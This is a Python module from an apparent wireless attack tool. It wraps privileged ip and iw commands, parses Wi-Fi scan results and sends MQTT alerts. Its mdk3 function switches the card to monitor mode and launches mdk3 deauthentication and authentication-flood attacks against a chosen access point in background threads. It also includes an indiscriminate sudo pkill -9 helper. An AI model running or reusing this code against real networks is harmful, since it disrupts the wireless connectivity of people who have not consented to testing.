"""Wireless subprocess helpers, scan parsing, progress output, and MQTT alerts.

Interface operations invoke privileged Linux commands. Importing this module
also configures logging and opens a process-lifetime handle to ``os.devnull``.
"""

import os
import re
import subprocess
import threading
import time
from functools import wraps
from typing import Any, Callable, Literal, Union

import click
import paho.mqtt.publish as publish
from rich.progress import (
    BarColumn,
    Progress,
    SpinnerColumn,
    TimeElapsedColumn,
    TimeRemainingColumn,
)

from config import Config
from console import console
from logger import logger

devnull = open(os.devnull, "wt")


def sleep(seconds: float, /, simple: bool = False):
    """Wait approximately ``seconds`` with a Rich progress bar or spinner."""
    cols = [
        SpinnerColumn(),
        BarColumn(),
        TimeRemainingColumn(),
        TimeElapsedColumn(),
    ]

    with Progress(*(cols if not simple else cols[:1]), transient=False) as progress:
        task = progress.add_task("[green]Processing", total=seconds)
        while not progress.finished:
            progress.update(task, advance=0.2)
            time.sleep(0.2)


def check_interface(timeout: int = 5):
    """Decorate an interface-first function with recursive availability retries.

    Each failed ``ip link show`` waits ``timeout`` seconds before trying again.
    Retries have no limit and can eventually exhaust the Python call stack.
    """
    def inner(func: Callable):
        """Wrap ``func`` while preserving its name and documentation."""
        @wraps(func)
        def wrapper(interface: str, *args, **kwargs) -> Any:
            """Check interface availability, then call ``func`` or retry."""
            p = subprocess.run(
                ["sudo", "ip", "link", "show", "dev", interface],
                capture_output=True,
                text=True,
            )

            if p.returncode:
                logger.error(
                    f"Interface '{interface}' is unavailable. Retrying in {timeout}s..."
                )
                logger.debug(f"{p.stderr.strip()}")
                sleep(timeout, simple=True)
                return wrapper(interface, *args, **kwargs)

            return func(interface, *args, **kwargs)

        return wrapper

    return inner


def kill(name: str):
    """Run privileged ``pkill -9`` by name, without checking its exit status.

    Matching processes are not restricted to those started by this project.
    """
    logger.info(f"Terminating any running '{name}' processes...")
    subprocess.run(
        ["sudo", "pkill", "-9", name],
        capture_output=True,
        text=True,
    )


@check_interface()
def mdk3(
    interface: str,
    bssid: str,
    channel: int,
    mode: int = 2,
    whitelist: Union[click.File, None] = None,
    blacklist: Union[click.File, None] = None,
) -> None:
    """Configure the interface and launch existing mdk3 modes in threads.

    Mode values above zero start deauthentication mode; values above one also
    start authentication mode directed at ``bssid``. List files are passed to
    deauthentication mode, which does not receive ``bssid`` as a target filter.
    Even nonpositive modes stop matching processes and configure the interface.
    """
    kill("mdk3")

    change_interface_type(interface, "monitor")
    change_interface_channel(interface, channel)

    logger.info(
        f"Launching mdk3 attack processes (interface={interface}, channel={channel})"
    )

    if mode > 0:
        cmd = ["sudo", "mdk3", interface, "d"]
        if whitelist:
            cmd.extend(["-w", whitelist.name])
        if blacklist:
            cmd.extend(["-b", blacklist.name])

        threading.Thread(
            target=subprocess.run,
            args=(cmd,),
            kwargs={"capture_output": True, "text": True, "check": False},
        ).start()

    if mode > 1:
        threading.Thread(
            target=subprocess.run,
            args=(["sudo", "mdk3", interface, "a", "-a", bssid, "-c", "-m"],),
            kwargs={"capture_output": True, "text": True, "check": False},
        ).start()


@check_interface()
def change_interface_status(interface: str, status: Literal["up", "down"]):
    """Set the link state and return zero or the ``ip`` command's exit code."""
    stdout = subprocess.run(
        ["sudo", "ip", "link", "show", "dev", interface],
        capture_output=True,
        text=True,
    ).stdout

    if (
        stdout
        and status == "up"
        and status.upper() in stdout
        or status == "down"
        and "UP" not in stdout
    ):
        return 0

    logger.debug(f"Setting interface '{interface}' state to {status.upper()}")
    p = subprocess.run(
        ["sudo", "ip", "link", "set", interface, status],
    )
    return p.returncode


@check_interface()
def change_interface_type(interface: str, _type: Literal["managed", "monitor"]):
    """Set the wireless mode, cycling link state, and return the mode exit code."""
    if (
        _type
        in subprocess.run(
            ["sudo", "iw", "dev", interface, "info"],
            capture_output=True,
            text=True,
        ).stdout
    ):
        return 0

    change_interface_status(interface, "down")

    logger.debug(f"Switching interface '{interface}' to {_type} mode")
    p = subprocess.run(
        ["sudo", "iw", "dev", interface, "set", "type", _type],
    )

    change_interface_status(interface, "up")
    return p.returncode


@check_interface()
def change_interface_channel(interface: str, channel: int):
    """Bring up monitor mode, select a channel, and return the ``iw`` exit code."""
    change_interface_type(interface, "monitor")
    change_interface_status(interface, "up")

    logger.debug(f"Setting interface '{interface}' to channel {channel}")
    p = subprocess.run(
        ["sudo", "iw", "dev", interface, "set", "channel", str(channel)],
    )
    return p.returncode


@check_interface()
def get_networks(interface: str):
    """Scan in managed mode and parse ``iw`` output into a BSSID mapping.

    Values normally contain ``[channel, ssid, signal, rsn]``. Signal is a
    string; RSN is a dictionary or ``None``. Missing channel data currently
    produces a shorter list. An empty result triggers an MQTT notification.
    Command failures are not distinguished from empty scan results.
    """
    change_interface_type(interface, "managed")
    change_interface_status(interface, "up")

    logger.debug("Scanning for nearby wireless networks...")
    process = subprocess.run(
        [
            "egrep",
            r"^BSS|SSID:|signal:|channel:|set: channel|RSN:|\*.Group.cipher:|\*.Pairwise.ciphers:|\*.Authentication.suites:",
        ],
        capture_output=True,
        input=subprocess.run(
            ["sudo", "iw", "dev", interface, "scan"],
            capture_output=True,
            text=True,
            check=False,
        ).stdout,
        text=True,
        check=False,
    )

    lst = []
    for a in [
        "\n".join([y.strip() for y in x.strip().split("\n")])
        for x in process.stdout.split("BSS")
        if x
    ]:
        item = []
        if search := re.search("([A-Za-z0-9]{2}:){1,}..", a):
            start, end = search.span()
            item.append(a[start:end])

        vals = []
        if search := re.search("channel:?.[0-9]{1,}", a):
            start, end = search.span()
            vals.append(
                int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None
            )

        if search := re.search("SSID:.*", a):
            start, end = search.span()
            vals.append(re.sub("SSID:.", "", a[start:end]))
        else:
            vals.append(None)

        if search := re.search("signal:.*", a):
            start, end = search.span()
            vals.append(re.sub("signal:.", "", a[start:end]))
        else:
            vals.append(None)

        if re.search(r"RSN", a):
            dct = {}

            if search := re.search(_ := r"RSN:.*\*\ Version:.*", a):
                start, end = search.span()
                dct.setdefault("version", int(re.sub(_[:-2], "", a[start:end]).strip()))
            else:
                dct.setdefault("version", None)

            if search := re.search(_ := r"\*.Group.cipher\:.*", a):
                start, end = search.span()
                dct.setdefault("group-cipher", re.sub(_[:-2], "", a[start:end]).strip())
            else:
                dct.setdefault("group-cipher", None)

            if search := re.search(_ := r"\*.Pairwise.ciphers\:.*", a):
                start, end = search.span()
                dct.setdefault(
                    "pairwise-ciphers", re.sub(_[:-2], "", a[start:end]).strip()
                )
            else:
                dct.setdefault("pairwise-ciphers", None)

            if search := re.search(_ := r"\*.Authentication.suites\:.*", a):
                start, end = search.span()
                dct.setdefault(
                    "authentication-suites", re.sub(_[:-2], "", a[start:end]).strip()
                )
            else:
                dct.setdefault("authentication-suites", None)

            vals.append(dct)
        else:
            vals.append(None)

        item.append(vals)
        lst.append(item)

    dct = dict(lst)

    if not dct:
        logger.warning(_ := "No wireless access points detected during scan.")
        notify(_)

    return dct


def notify(payload) -> int:
    """Publish one MQTT message using environment-backed broker settings.

    Return zero on success or one for a refused connection. Other exceptions,
    including invalid settings and DNS failures, propagate to the caller.
    """
    try:
        publish.single(
            topic=Config.TOPIC,
            payload=payload,
            hostname=Config.BROKER_IP,
            auth={"username": Config.USERNAME, "password": Config.PASSWORD},
        )

        return 0
    except ConnectionRefusedError as err:
        console.print(rf"ERROR: {err}")

    return 1


def main() -> None:
    """Do nothing; helpers are consumed by the target module."""
    pass


if __name__ == "__main__":
    main()
